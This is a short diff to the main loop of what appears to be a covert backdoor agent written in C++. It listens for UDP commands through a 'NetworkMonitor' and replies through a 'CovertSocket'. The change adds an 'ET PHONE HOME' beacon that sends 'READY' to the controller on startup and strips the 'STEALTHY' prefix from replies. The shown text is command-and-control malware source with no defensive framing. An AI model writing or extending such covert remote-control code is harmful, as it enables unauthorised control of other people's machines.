@@ -155,6 +155,10 @@ int main(int argc, char * argv[]) {
     //start monitoring for UDP traffic. If it is our own, it needs handling, if not, add it to traffic analyzer
     CovertSocket * socket = CovertSocket::getInstance(); //how we respond to commands
     monitor = NetworkMonitor::getInstance(); //how we listen for commands
+
+    //ET PHONE HOME
+    socket->send("READY");
+
     while(keepListening){
 
         string command = monitor->listenForTraffic(listeningInterface); //this will hang until a single unit of data is received and then return it
@@ -173,7 +177,7 @@ int main(int argc, char * argv[]) {
             break;
         }
 
-        socket->send("STEALTHY:/> " + response);
+        socket->send(response);
     }
 
 
